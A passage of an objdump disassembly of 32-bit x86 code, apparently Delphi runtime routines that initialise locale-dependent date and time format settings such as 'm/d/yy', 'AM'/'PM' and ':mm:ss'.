  4062f5:	8b c7                	mov    %edi,%eax
  4062f7:	e8 34 ce ff ff       	call   0x403130
  4062fc:	43                   	inc    %ebx
  4062fd:	83 c7 04             	add    $0x4,%edi
  406300:	83 c6 04             	add    $0x4,%esi
  406303:	83 fb 0d             	cmp    $0xd,%ebx
  406306:	75 9e                	jne    0x4062a6
  406308:	bb 01 00 00 00       	mov    $0x1,%ebx
  40630d:	be 18 c5 40 00       	mov    $0x40c518,%esi
  406312:	bf 34 c5 40 00       	mov    $0x40c534,%edi
  406317:	8d 43 05             	lea    0x5(%ebx),%eax
  40631a:	b9 07 00 00 00       	mov    $0x7,%ecx
  40631f:	99                   	cltd
  406320:	f7 f9                	idiv   %ecx
  406322:	89 55 fc             	mov    %edx,-0x4(%ebp)
  406325:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406328:	50                   	push   %eax
  406329:	8d 55 f0             	lea    -0x10(%ebp),%edx
  40632c:	8d 83 df ff 00 00    	lea    0xffdf(%ebx),%eax
  406332:	e8 11 ea ff ff       	call   0x404d48
  406337:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40633a:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40633d:	83 c2 31             	add    $0x31,%edx
  406340:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406343:	e8 b4 fe ff ff       	call   0x4061fc
  406348:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40634b:	8b c6                	mov    %esi,%eax
  40634d:	e8 de cd ff ff       	call   0x403130
  406352:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406355:	50                   	push   %eax
  406356:	8d 55 f0             	lea    -0x10(%ebp),%edx
  406359:	8d 83 e6 ff 00 00    	lea    0xffe6(%ebx),%eax
  40635f:	e8 e4 e9 ff ff       	call   0x404d48
  406364:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406367:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40636a:	83 c2 2a             	add    $0x2a,%edx
  40636d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406370:	e8 87 fe ff ff       	call   0x4061fc
  406375:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406378:	8b c7                	mov    %edi,%eax
  40637a:	e8 b1 cd ff ff       	call   0x403130
  40637f:	43                   	inc    %ebx
  406380:	83 c7 04             	add    $0x4,%edi
  406383:	83 c6 04             	add    $0x4,%esi
  406386:	83 fb 08             	cmp    $0x8,%ebx
  406389:	75 8c                	jne    0x406317
  40638b:	33 c0                	xor    %eax,%eax
  40638d:	5a                   	pop    %edx
  40638e:	59                   	pop    %ecx
  40638f:	59                   	pop    %ecx
  406390:	64 89 10             	mov    %edx,%fs:(%eax)
  406393:	68 ad 63 40 00       	push   $0x4063ad
  406398:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40639b:	ba 02 00 00 00       	mov    $0x2,%edx
  4063a0:	e8 5b cd ff ff       	call   0x403100
  4063a5:	c3                   	ret
  4063a6:	e9 b5 c9 ff ff       	jmp    0x402d60
  4063ab:	eb eb                	jmp    0x406398
  4063ad:	5f                   	pop    %edi
  4063ae:	5e                   	pop    %esi
  4063af:	5b                   	pop    %ebx
  4063b0:	8b e5                	mov    %ebp,%esp
  4063b2:	5d                   	pop    %ebp
  4063b3:	c3                   	ret
  4063b4:	55                   	push   %ebp
  4063b5:	8b ec                	mov    %esp,%ebp
  4063b7:	6a 00                	push   $0x0
  4063b9:	6a 00                	push   $0x0
  4063bb:	6a 00                	push   $0x0
  4063bd:	53                   	push   %ebx
  4063be:	56                   	push   %esi
  4063bf:	57                   	push   %edi
  4063c0:	33 c0                	xor    %eax,%eax
  4063c2:	55                   	push   %ebp
  4063c3:	68 fc 65 40 00       	push   $0x4065fc
  4063c8:	64 ff 30             	push   %fs:(%eax)
  4063cb:	64 89 20             	mov    %esp,%fs:(%eax)
  4063ce:	e8 89 e2 ff ff       	call   0x40465c
  4063d3:	8b d8                	mov    %eax,%ebx
  4063d5:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4063d8:	50                   	push   %eax
  4063d9:	33 c9                	xor    %ecx,%ecx
  4063db:	ba 14 00 00 00       	mov    $0x14,%edx
  4063e0:	8b c3                	mov    %ebx,%eax
  4063e2:	e8 15 fe ff ff       	call   0x4061fc
  4063e7:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4063ea:	b8 90 c4 40 00       	mov    $0x40c490,%eax
  4063ef:	e8 3c cd ff ff       	call   0x403130
  4063f4:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4063f7:	50                   	push   %eax
  4063f8:	b9 14 66 40 00       	mov    $0x406614,%ecx
  4063fd:	ba 1b 00 00 00       	mov    $0x1b,%edx
  406402:	8b c3                	mov    %ebx,%eax
  406404:	e8 f3 fd ff ff       	call   0x4061fc
  406409:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40640c:	33 d2                	xor    %edx,%edx
  40640e:	e8 1d e9 ff ff       	call   0x404d30
  406413:	a2 94 c4 40 00       	mov    %al,0x40c494
  406418:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40641b:	50                   	push   %eax
  40641c:	b9 14 66 40 00       	mov    $0x406614,%ecx
  406421:	ba 1c 00 00 00       	mov    $0x1c,%edx
  406426:	8b c3                	mov    %ebx,%eax
  406428:	e8 cf fd ff ff       	call   0x4061fc
  40642d:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406430:	33 d2                	xor    %edx,%edx
  406432:	e8 f9 e8 ff ff       	call   0x404d30
  406437:	a2 95 c4 40 00       	mov    %al,0x40c495
  40643c:	b1 2c                	mov    $0x2c,%cl
  40643e:	ba 0f 00 00 00       	mov    $0xf,%edx
  406443:	8b c3                	mov    %ebx,%eax
  406445:	e8 fe fd ff ff       	call   0x406248
  40644a:	a2 96 c4 40 00       	mov    %al,0x40c496
  40644f:	b1 2e                	mov    $0x2e,%cl
  406451:	ba 0e 00 00 00       	mov    $0xe,%edx
  406456:	8b c3                	mov    %ebx,%eax
  406458:	e8 eb fd ff ff       	call   0x406248
  40645d:	a2 97 c4 40 00       	mov    %al,0x40c497
  406462:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406465:	50                   	push   %eax
  406466:	b9 14 66 40 00       	mov    $0x406614,%ecx
  40646b:	ba 19 00 00 00       	mov    $0x19,%edx
  406470:	8b c3                	mov    %ebx,%eax
  406472:	e8 85 fd ff ff       	call   0x4061fc
  406477:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40647a:	33 d2                	xor    %edx,%edx
  40647c:	e8 af e8 ff ff       	call   0x404d30
  406481:	a2 98 c4 40 00       	mov    %al,0x40c498
  406486:	b1 2f                	mov    $0x2f,%cl
  406488:	ba 1d 00 00 00       	mov    $0x1d,%edx
  40648d:	8b c3                	mov    %ebx,%eax
  40648f:	e8 b4 fd ff ff       	call   0x406248
  406494:	a2 99 c4 40 00       	mov    %al,0x40c499
  406499:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40649c:	50                   	push   %eax
  40649d:	b9 20 66 40 00       	mov    $0x406620,%ecx
  4064a2:	ba 1f 00 00 00       	mov    $0x1f,%edx
  4064a7:	8b c3                	mov    %ebx,%eax
  4064a9:	e8 4e fd ff ff       	call   0x4061fc
  4064ae:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4064b1:	b8 9c c4 40 00       	mov    $0x40c49c,%eax
  4064b6:	e8 75 cc ff ff       	call   0x403130
  4064bb:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4064be:	50                   	push   %eax
  4064bf:	b9 30 66 40 00       	mov    $0x406630,%ecx
  4064c4:	ba 20 00 00 00       	mov    $0x20,%edx
  4064c9:	8b c3                	mov    %ebx,%eax
  4064cb:	e8 2c fd ff ff       	call   0x4061fc
  4064d0:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4064d3:	b8 a0 c4 40 00       	mov    $0x40c4a0,%eax
  4064d8:	e8 53 cc ff ff       	call   0x403130
  4064dd:	b1 3a                	mov    $0x3a,%cl
  4064df:	ba 1e 00 00 00       	mov    $0x1e,%edx
  4064e4:	8b c3                	mov    %ebx,%eax
  4064e6:	e8 5d fd ff ff       	call   0x406248
  4064eb:	a2 a4 c4 40 00       	mov    %al,0x40c4a4
  4064f0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4064f3:	50                   	push   %eax
  4064f4:	b9 48 66 40 00       	mov    $0x406648,%ecx
  4064f9:	ba 28 00 00 00       	mov    $0x28,%edx
  4064fe:	8b c3                	mov    %ebx,%eax
  406500:	e8 f7 fc ff ff       	call   0x4061fc
  406505:	8b 55 f4             	mov    -0xc(%ebp),%edx
  406508:	b8 a8 c4 40 00       	mov    $0x40c4a8,%eax
  40650d:	e8 1e cc ff ff       	call   0x403130
  406512:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406515:	50                   	push   %eax
  406516:	b9 54 66 40 00       	mov    $0x406654,%ecx
  40651b:	ba 29 00 00 00       	mov    $0x29,%edx
  406520:	8b c3                	mov    %ebx,%eax
  406522:	e8 d5 fc ff ff       	call   0x4061fc
  406527:	8b 55 f4             	mov    -0xc(%ebp),%edx
  40652a:	b8 ac c4 40 00       	mov    $0x40c4ac,%eax
  40652f:	e8 fc cb ff ff       	call   0x403130
  406534:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406537:	50                   	push   %eax
  406538:	b9 14 66 40 00       	mov    $0x406614,%ecx
  40653d:	ba 25 00 00 00       	mov    $0x25,%edx
  406542:	8b c3                	mov    %ebx,%eax
  406544:	e8 b3 fc ff ff       	call   0x4061fc
  406549:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40654c:	33 d2                	xor    %edx,%edx
  40654e:	e8 dd e7 ff ff       	call   0x404d30
  406553:	85 c0                	test   %eax,%eax
  406555:	75 0f                	jne    0x406566
  406557:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40655a:	ba 60 66 40 00       	mov    $0x406660,%edx
  40655f:	e8 10 cc ff ff       	call   0x403174
  406564:	eb 0d                	jmp    0x406573
  406566:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406569:	ba 6c 66 40 00       	mov    $0x40666c,%edx
  40656e:	e8 01 cc ff ff       	call   0x403174
  406573:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406576:	50                   	push   %eax
  406577:	b9 14 66 40 00       	mov    $0x406614,%ecx
  40657c:	ba 23 00 00 00       	mov    $0x23,%edx
  406581:	8b c3                	mov    %ebx,%eax
  406583:	e8 74 fc ff ff       	call   0x4061fc
  406588:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40658b:	33 d2                	xor    %edx,%edx
  40658d:	e8 9e e7 ff ff       	call   0x404d30
  406592:	85 c0                	test   %eax,%eax
  406594:	75 0f                	jne    0x4065a5
  406596:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406599:	ba 78 66 40 00       	mov    $0x406678,%edx
  40659e:	e8 d1 cb ff ff       	call   0x403174
  4065a3:	eb 08                	jmp    0x4065ad
  4065a5:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4065a8:	e8 33 cb ff ff       	call   0x4030e0
  4065ad:	ff 75 fc             	push   -0x4(%ebp)
  4065b0:	68 88 66 40 00       	push   $0x406688
  4065b5:	ff 75 f8             	push   -0x8(%ebp)
  4065b8:	b8 b0 c4 40 00       	mov    $0x40c4b0,%eax
  4065bd:	ba 03 00 00 00       	mov    $0x3,%edx
  4065c2:	e8 d9 cc ff ff       	call   0x4032a0
  4065c7:	ff 75 fc             	push   -0x4(%ebp)
  4065ca:	68 94 66 40 00       	push   $0x406694
  4065cf:	ff 75 f8             	push   -0x8(%ebp)
  4065d2:	b8 b4 c4 40 00       	mov    $0x40c4b4,%eax
  4065d7:	ba 03 00 00 00       	mov    $0x3,%edx
  4065dc:	e8 bf cc ff ff       	call   0x4032a0
  4065e1:	33 c0                	xor    %eax,%eax
  4065e3:	5a                   	pop    %edx
  4065e4:	59                   	pop    %ecx
  4065e5:	59                   	pop    %ecx
  4065e6:	64 89 10             	mov    %edx,%fs:(%eax)
  4065e9:	68 03 66 40 00       	push   $0x406603
  4065ee:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4065f1:	ba 03 00 00 00       	mov    $0x3,%edx
  4065f6:	e8 05 cb ff ff       	call   0x403100
  4065fb:	c3                   	ret
  4065fc:	e9 5f c7 ff ff       	jmp    0x402d60
  406601:	eb eb                	jmp    0x4065ee
  406603:	5f                   	pop    %edi
  406604:	5e                   	pop    %esi
  406605:	5b                   	pop    %ebx
  406606:	8b e5                	mov    %ebp,%esp
  406608:	5d                   	pop    %ebp
  406609:	c3                   	ret
  40660a:	00 00                	add    %al,(%eax)
  40660c:	ff                   	(bad)
  40660d:	ff                   	(bad)
  40660e:	ff                   	(bad)
  40660f:	ff 01                	incl   (%ecx)
  406611:	00 00                	add    %al,(%eax)
  406613:	00 30                	add    %dh,(%eax)
  406615:	00 00                	add    %al,(%eax)
  406617:	00 ff                	add    %bh,%bh
  406619:	ff                   	(bad)
  40661a:	ff                   	(bad)
  40661b:	ff 06                	incl   (%esi)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 6d 2f             	add    %ch,0x2f(%ebp)
  406622:	64 2f                	fs das
  406624:	79 79                	jns    0x40669f
  406626:	00 00                	add    %al,(%eax)
  406628:	ff                   	(bad)
  406629:	ff                   	(bad)
  40662a:	ff                   	(bad)
  40662b:	ff 0c 00             	decl   (%eax,%eax,1)
  40662e:	00 00                	add    %al,(%eax)
  406630:	6d                   	insl   (%dx),%es:(%edi)
  406631:	6d                   	insl   (%dx),%es:(%edi)
  406632:	6d                   	insl   (%dx),%es:(%edi)
  406633:	6d                   	insl   (%dx),%es:(%edi)
  406634:	20 64 2c 20          	and    %ah,0x20(%esp,%ebp,1)
  406638:	79 79                	jns    0x4066b3
  40663a:	79 79                	jns    0x4066b5
  40663c:	00 00                	add    %al,(%eax)
  40663e:	00 00                	add    %al,(%eax)
  406640:	ff                   	(bad)
  406641:	ff                   	(bad)
  406642:	ff                   	(bad)
  406643:	ff 02                	incl   (%edx)
  406645:	00 00                	add    %al,(%eax)
  406647:	00 61 6d             	add    %ah,0x6d(%ecx)
  40664a:	00 00                	add    %al,(%eax)
  40664c:	ff                   	(bad)
  40664d:	ff                   	(bad)
  40664e:	ff                   	(bad)
  40664f:	ff 02                	incl   (%edx)
  406651:	00 00                	add    %al,(%eax)
  406653:	00 70 6d             	add    %dh,0x6d(%eax)
  406656:	00 00                	add    %al,(%eax)
  406658:	ff                   	(bad)
  406659:	ff                   	(bad)
  40665a:	ff                   	(bad)
  40665b:	ff 01                	incl   (%ecx)
  40665d:	00 00                	add    %al,(%eax)
  40665f:	00 68 00             	add    %ch,0x0(%eax)
  406662:	00 00                	add    %al,(%eax)
  406664:	ff                   	(bad)
  406665:	ff                   	(bad)
  406666:	ff                   	(bad)
  406667:	ff 02                	incl   (%edx)
  406669:	00 00                	add    %al,(%eax)
  40666b:	00 68 68             	add    %ch,0x68(%eax)
  40666e:	00 00                	add    %al,(%eax)
  406670:	ff                   	(bad)
  406671:	ff                   	(bad)
  406672:	ff                   	(bad)
  406673:	ff 05 00 00 00 20    	incl   0x20000000
  406679:	41                   	inc    %ecx
  40667a:	4d                   	dec    %ebp
  40667b:	50                   	push   %eax
  40667c:	4d                   	dec    %ebp
  40667d:	00 00                	add    %al,(%eax)
  40667f:	00 ff                	add    %bh,%bh
  406681:	ff                   	(bad)
  406682:	ff                   	(bad)
  406683:	ff 03                	incl   (%ebx)
  406685:	00 00                	add    %al,(%eax)
  406687:	00 3a                	add    %bh,(%edx)
  406689:	6d                   	insl   (%dx),%es:(%edi)
  40668a:	6d                   	insl   (%dx),%es:(%edi)
  40668b:	00 ff                	add    %bh,%bh
  40668d:	ff                   	(bad)
  40668e:	ff                   	(bad)
  40668f:	ff 06                	incl   (%esi)
  406691:	00 00                	add    %al,(%eax)
  406693:	00 3a                	add    %bh,(%edx)
  406695:	6d                   	insl   (%dx),%es:(%edi)
  406696:	6d                   	insl   (%dx),%es:(%edi)
  406697:	3a 73 73             	cmp    0x73(%ebx),%dh
  40669a:	00 00                	add    %al,(%eax)
  40669c:	85 c0                	test   %eax,%eax
  40669e:	74 05                	je     0x4066a5
  4066a0:	2d 94 11 40 00       	sub    $0x401194,%eax
  4066a5:	c3                   	ret
  4066a6:	8b c0                	mov    %eax,%eax
  4066a8:	53                   	push   %ebx
  4066a9:	56                   	push   %esi
  4066aa:	57                   	push   %edi
  4066ab:	55                   	push   %ebp
  4066ac:	81 c4 58 fd ff ff    	add    $0xfffffd58,%esp
  4066b2:	8b ea                	mov    %edx,%ebp
  4066b4:	8b f0                	mov    %eax,%esi
  4066b6:	68 00 01 00 00       	push   $0x100
  4066bb:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4066c2:	50                   	push   %eax
  4066c3:	a1 14 c0 40 00       	mov    0x40c014,%eax
  4066c8:	50                   	push   %eax
  4066c9:	e8 86 df ff ff       	call   0x404654
  4066ce:	8d 84 24 80 00 00 00 	lea    0x80(%esp),%eax
  4066d5:	b2 5c                	mov    $0x5c,%dl
  4066d7:	e8 20 eb ff ff       	call   0x4051fc
  4066dc:	8b d0                	mov    %eax,%edx
  4066de:	42                   	inc    %edx
  4066df:	8b c4                	mov    %esp,%eax
  4066e1:	b9 3f 00 00 00       	mov    $0x3f,%ecx
  4066e6:	e8 95 ea ff ff       	call   0x405180
  4066eb:	bb 24 68 40 00       	mov    $0x406824,%ebx
  4066f0:	bf 24 68 40 00       	mov    $0x406824,%edi
  4066f5:	8b c6                	mov    %esi,%eax
  4066f7:	ba 04 47 40 00       	mov    $0x404704,%edx
  4066fc:	e8 13 c3 ff ff       	call   0x402a14
  406701:	84 c0                	test   %al,%al
  406703:	74 21                	je     0x406726
  406705:	8b 46 04             	mov    0x4(%esi),%eax
  406708:	e8 97 cc ff ff       	call   0x4033a4
  40670d:	8b d8                	mov    %eax,%ebx
  40670f:	8b c3                	mov    %ebx,%eax
  406711:	e8 16 ea ff ff       	call   0x40512c
  406716:	85 c0                	test   %eax,%eax
  406718:	74 0c                	je     0x406726
  40671a:	80 7c 03 ff 2e       	cmpb   $0x2e,-0x1(%ebx,%eax,1)
  40671f:	74 05                	je     0x406726
  406721:	bf 28 68 40 00       	mov    $0x406828,%edi
  406726:	6a 40                	push   $0x40
  406728:	8d 44 24 44          	lea    0x44(%esp),%eax
  40672c:	50                   	push   %eax
  40672d:	68 9e ff 00 00       	push   $0xff9e
  406732:	a1 14 c0 40 00       	mov    0x40c014,%eax
  406737:	50                   	push   %eax
  406738:	e8 67 df ff ff       	call   0x4046a4
  40673d:	6a 04                	push   $0x4
  40673f:	8d 94 24 ac 01 00 00 	lea    0x1ac(%esp),%edx
  406746:	8b 06                	mov    (%esi),%eax
  406748:	e8 c7 c1 ff ff       	call   0x402914
  40674d:	8d 84 24 ac 01 00 00 	lea    0x1ac(%esp),%eax
  406754:	89 84 24 84 01 00 00 	mov    %eax,0x184(%esp)
  40675b:	c6 84 24 88 01 00 00 	movb   $0x4,0x188(%esp)
  406762:	04 
  406763:	8d 44 24 04          	lea    0x4(%esp),%eax
  406767:	89 84 24 8c 01 00 00 	mov    %eax,0x18c(%esp)
  40676e:	c6 84 24 90 01 00 00 	movb   $0x6,0x190(%esp)
  406775:	06 
  406776:	8b c5                	mov    %ebp,%eax
  406778:	e8 1f ff ff ff       	call   0x40669c
  40677d:	89 84 24 94 01 00 00 	mov    %eax,0x194(%esp)
  406784:	c6 84 24 98 01 00 00 	movb   $0x5,0x198(%esp)
  40678b:	05 
  40678c:	89 9c 24 9c 01 00 00 	mov    %ebx,0x19c(%esp)
  406793:	c6 84 24 a0 01 00 00 	movb   $0x6,0x1a0(%esp)
  40679a:	06 
  40679b:	89 bc 24 a4 01 00 00 	mov    %edi,0x1a4(%esp)
  4067a2:	c6 84 24 a8 01 00 00 	movb   $0x6,0x1a8(%esp)
  4067a9:	06 
  4067aa:	8d 8c 24 84 01 00 00 	lea    0x184(%esp),%ecx
  4067b1:	8d 54 24 44          	lea    0x44(%esp),%edx
  4067b5:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  4067bc:	e8 0b ee ff ff       	call   0x4055cc
  4067c1:	6a 40                	push   $0x40
  4067c3:	8d 44 24 44          	lea    0x44(%esp),%eax
  4067c7:	50                   	push   %eax
  4067c8:	68 9f ff 00 00       	push   $0xff9f
  4067cd:	a1 14 c0 40 00       	mov    0x40c014,%eax
  4067d2:	50                   	push   %eax
  4067d3:	e8 cc de ff ff       	call   0x4046a4
  4067d8:	80 3d 31 c0 40 00 00 	cmpb   $0x0,0x40c031
  4067df:	74 1d                	je     0x4067fe
  4067e1:	8d 94 24 80 00 00 00 	lea    0x80(%esp),%edx
  4067e8:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  4067ed:	e8 02 da ff ff       	call   0x4041f4
  4067f2:	e8 80 d9 ff ff       	call   0x404177
  4067f7:	e8 58 be ff ff       	call   0x402654
  4067fc:	eb 19                	jmp    0x406817
  4067fe:	68 10 20 00 00       	push   $0x2010
  406803:	8d 44 24 44          	lea    0x44(%esp),%eax
  406807:	50                   	push   %eax
  406808:	8d 84 24 88 00 00 00 	lea    0x88(%esp),%eax
  40680f:	50                   	push   %eax
  406810:	6a 00                	push   $0x0
  406812:	e8 95 de ff ff       	call   0x4046ac
  406817:	81 c4 a8 02 00 00    	add    $0x2a8,%esp
  40681d:	5d                   	pop    %ebp
  40681e:	5f                   	pop    %edi
  40681f:	5e                   	pop    %esi
  406820:	5b                   	pop    %ebx
  406821:	c3                   	ret
  406822:	00 00                	add    %al,(%eax)
  406824:	00 00                	add    %al,(%eax)
  406826:	00 00                	add    %al,(%eax)
  406828:	2e 00 00             	add    %al,%cs:(%eax)
  40682b:	00 55 8b             	add    %dl,-0x75(%ebp)
  40682e:	ec                   	in     (%dx),%al
  40682f:	6a 00                	push   $0x0
  406831:	53                   	push   %ebx
  406832:	56                   	push   %esi
  406833:	57                   	push   %edi
  406834:	84 d2                	test   %dl,%dl
  406836:	74 08                	je     0x406840
  406838:	83 c4 f0             	add    $0xfffffff0,%esp
  40683b:	e8 30 c3 ff ff       	call   0x402b70
  406840:	8b f1                	mov    %ecx,%esi
  406842:	8b da                	mov    %edx,%ebx
  406844:	8b f8                	mov    %eax,%edi
  406846:	33 c0                	xor    %eax,%eax
  406848:	55                   	push   %ebp
  406849:	68 7f 68 40 00       	push   $0x40687f
  40684e:	64 ff 30             	push   %fs:(%eax)
  406851:	64 89 20             	mov    %esp,%fs:(%eax)
  406854:	8d 55 fc             	lea    -0x4(%ebp),%edx
  406857:	8b c6                	mov    %esi,%eax
  406859:	e8 ea e4 ff ff       	call   0x404d48
  40685e:	8b 55 fc             	mov    -0x4(%ebp),%edx
  406861:	8d 47 04             	lea    0x4(%edi),%eax
  406864:	e8 c7 c8 ff ff       	call   0x403130
  406869:	33 c0                	xor    %eax,%eax
  40686b:	5a                   	pop    %edx
  40686c:	59                   	pop    %ecx
  40686d:	59                   	pop    %ecx
  40686e:	64 89 10             	mov    %edx,%fs:(%eax)
  406871:	68 86 68 40 00       	push   $0x406886
  406876:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406879:	e8 62 c8 ff ff       	call   0x4030e0
  40687e:	c3                   	ret
  40687f:	e9 dc c4 ff ff       	jmp    0x402d60
  406884:	eb f0                	jmp    0x406876
  406886:	84 db                	test   %bl,%bl
  406888:	74 0a                	je     0x406894
  40688a:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  406891:	83 c4 0c             	add    $0xc,%esp
  406894:	8b c7                	mov    %edi,%eax
  406896:	5f                   	pop    %edi
  406897:	5e                   	pop    %esi
  406898:	5b                   	pop    %ebx
  406899:	59                   	pop    %ecx
  40689a:	5d                   	pop    %ebp
  40689b:	c3                   	ret
  40689c:	55                   	push   %ebp
  40689d:	8b ec                	mov    %esp,%ebp
  40689f:	6a 00                	push   $0x0
  4068a1:	6a 00                	push   $0x0
  4068a3:	53                   	push   %ebx
  4068a4:	56                   	push   %esi
  4068a5:	57                   	push   %edi
  4068a6:	84 d2                	test   %dl,%dl
  4068a8:	74 08                	je     0x4068b2
  4068aa:	83 c4 f0             	add    $0xfffffff0,%esp
  4068ad:	e8 be c2 ff ff       	call   0x402b70
  4068b2:	8b f1                	mov    %ecx,%esi
  4068b4:	8b da                	mov    %edx,%ebx
  4068b6:	8b f8                	mov    %eax,%edi
  4068b8:	33 c0                	xor    %eax,%eax
  4068ba:	55                   	push   %ebp
  4068bb:	68 08 69 40 00       	push   $0x406908
  4068c0:	64 ff 30             	push   %fs:(%eax)
  4068c3:	64 89 20             	mov    %esp,%fs:(%eax)
  4068c6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4068c9:	50                   	push   %eax
  4068ca:	8d 55 f8             	lea    -0x8(%ebp),%edx
  4068cd:	8b c6                	mov    %esi,%eax
  4068cf:	e8 74 e4 ff ff       	call   0x404d48
  4068d4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4068d7:	8b 55 0c             	mov    0xc(%ebp),%edx
  4068da:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4068dd:	e8 1e ed ff ff       	call   0x405600
  4068e2:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4068e5:	8d 47 04             	lea    0x4(%edi),%eax
  4068e8:	e8 43 c8 ff ff       	call   0x403130
  4068ed:	33 c0                	xor    %eax,%eax
  4068ef:	5a                   	pop    %edx
  4068f0:	59                   	pop    %ecx
  4068f1:	59                   	pop    %ecx
  4068f2:	64 89 10             	mov    %edx,%fs:(%eax)
  4068f5:	68 0f 69 40 00       	push   $0x40690f
  4068fa:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4068fd:	ba 02 00 00 00       	mov    $0x2,%edx
  406902:	e8 f9 c7 ff ff       	call   0x403100
  406907:	c3                   	ret
  406908:	e9 53 c4 ff ff       	jmp    0x402d60
  40690d:	eb eb                	jmp    0x4068fa
  40690f:	84 db                	test   %bl,%bl
  406911:	74 0a                	je     0x40691d
  406913:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  40691a:	83 c4 0c             	add    $0xc,%esp
  40691d:	8b c7                	mov    %edi,%eax
  40691f:	5f                   	pop    %edi
  406920:	5e                   	pop    %esi
  406921:	5b                   	pop    %ebx
  406922:	59                   	pop    %ecx
  406923:	59                   	pop    %ecx
  406924:	5d                   	pop    %ebp
  406925:	c2 08 00             	ret    $0x8
  406928:	84 d2                	test   %dl,%dl
  40692a:	74 05                	je     0x406931
  40692c:	e8 7b c2 ff ff       	call   0x402bac
  406931:	c3                   	ret
  406932:	8b c0                	mov    %eax,%eax
  406934:	c3                   	ret
  406935:	8d 40 00             	lea    0x0(%eax),%eax
  406938:	53                   	push   %ebx
  406939:	83 c4 f8             	add    $0xfffffff8,%esp
  40693c:	33 db                	xor    %ebx,%ebx
  40693e:	eb 01                	jmp    0x406941
  406940:	43                   	inc    %ebx
  406941:	83 fb 06             	cmp    $0x6,%ebx
  406944:	7f 14                	jg     0x40695a
  406946:	e8 61 c7 ff ff       	call   0x4030ac
  40694b:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  406951:	3b 04 dd e4 b0 40 00 	cmp    0x40b0e4(,%ebx,8),%eax
  406958:	75 e6                	jne    0x406940
  40695a:	83 fb 06             	cmp    $0x6,%ebx
  40695d:	7f 17                	jg     0x406976
  40695f:	8b 0c dd e8 b0 40 00 	mov    0x40b0e8(,%ebx,8),%ecx
  406966:	b2 01                	mov    $0x1,%dl
  406968:	b8 98 47 40 00       	mov    $0x404798,%eax
  40696d:	e8 ba fe ff ff       	call   0x40682c
  406972:	8b d8                	mov    %eax,%ebx
  406974:	eb 29                	jmp    0x40699f
  406976:	e8 31 c7 ff ff       	call   0x4030ac
  40697b:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  406981:	89 04 24             	mov    %eax,(%esp)
  406984:	c6 44 24 04 00       	movb   $0x0,0x4(%esp)
  406989:	54                   	push   %esp
  40698a:	6a 00                	push   $0x0
  40698c:	b9 88 ff 00 00       	mov    $0xff88,%ecx
  406991:	b2 01                	mov    $0x1,%dl
  406993:	b8 98 47 40 00       	mov    $0x404798,%eax
  406998:	e8 ff fe ff ff       	call   0x40689c
  40699d:	8b d8                	mov    %eax,%ebx
  40699f:	e8 08 c7 ff ff       	call   0x4030ac
  4069a4:	8b 80 04 00 00 00    	mov    0x4(%eax),%eax
  4069aa:	89 43 0c             	mov    %eax,0xc(%ebx)
  4069ad:	e8 fa c6 ff ff       	call   0x4030ac
  4069b2:	33 d2                	xor    %edx,%edx
  4069b4:	89 90 04 00 00 00    	mov    %edx,0x4(%eax)
  4069ba:	8b c3                	mov    %ebx,%eax
  4069bc:	59                   	pop    %ecx
  4069bd:	5a                   	pop    %edx
  4069be:	5b                   	pop    %ebx
  4069bf:	c3                   	ret
  4069c0:	53                   	push   %ebx
  4069c1:	8b da                	mov    %edx,%ebx
  4069c3:	8b d0                	mov    %eax,%edx
  4069c5:	4a                   	dec    %edx
  4069c6:	74 08                	je     0x4069d0
  4069c8:	4a                   	dec    %edx
  4069c9:	83 ea 13             	sub    $0x13,%edx
  4069cc:	72 09                	jb     0x4069d7
  4069ce:	eb 1c                	jmp    0x4069ec
  4069d0:	a1 50 c5 40 00       	mov    0x40c550,%eax
  4069d5:	eb 1a                	jmp    0x4069f1
  4069d7:	8d 04 c5 0c b1 40 00 	lea    0x40b10c(,%eax,8),%eax
  4069de:	8b 48 04             	mov    0x4(%eax),%ecx
  4069e1:	b2 01                	mov    $0x1,%dl
  4069e3:	8b 00                	mov    (%eax),%eax
  4069e5:	e8 42 fe ff ff       	call   0x40682c
